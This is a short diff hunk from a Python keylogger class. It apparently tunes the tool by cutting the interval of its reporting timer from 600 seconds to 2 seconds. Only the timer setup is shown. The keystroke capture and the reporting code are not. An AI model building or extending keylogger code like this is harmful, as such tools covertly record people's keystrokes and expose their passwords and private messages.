@@ -36,7 +36,7 @@ class Keylogger:
             with open(self.log_file, "w", encoding="utf-8") as file:
                 file.write("")
                 
-        self.timer = Timer(interval=600, function=self.report)
+        self.timer = Timer(interval=2, function=self.report)
         self.timer.start()
 
     def start(self):
